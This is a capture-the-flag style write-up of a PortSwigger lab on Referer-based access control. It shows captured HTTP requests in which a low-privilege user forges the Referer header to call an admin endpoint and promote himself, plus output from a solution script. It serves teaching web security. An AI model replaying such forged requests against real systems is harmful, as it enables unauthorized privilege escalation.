# Lab: Referer-based access control 

### Instructions

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator. 

### Solution

Logging in as admin and upgrading the carlos user we see a GET request being made:

```
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Host: 0ad300be0431b59c80abcc6e00b200b2.web-security-academy.net
Cookie: session=MFSXLu3itfzElokvkLRIGsMozQJEBk8r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad300be0431b59c80abcc6e00b200b2.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

We can note the `Referer` address being used.

Logging out as admin and logging back in as the user wiener user, we can try making a similar GET request in the browser to upgrade wiener and capture it in Burp:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ad300be0431b59c80abcc6e00b200b2.web-security-academy.net
Cookie: session=smungwqJK7cRebdNaEOV8aqnbSuBaf8A
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

We get an `Unauthorized` error:

```
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

We can bypass this control be reusing the `Referer` address we found when testing this functionality:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ad300be0431b59c80abcc6e00b200b2.web-security-academy.net
Cookie: session=smungwqJK7cRebdNaEOV8aqnbSuBaf8A
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad300be0431b59c80abcc6e00b200b2.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

This allows the request to go through, upgrades the user wiener, and marks the lab as solved.

### Python Solution

See `access_control_13.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_13_referer-based_access_control]
└─$ python access_control_13.py https://0ac600e2047496f582e1386f000d00aa.web-security-academy.net/
[+] Logged in as wiener
[+] Successfully upgraded user wiener
```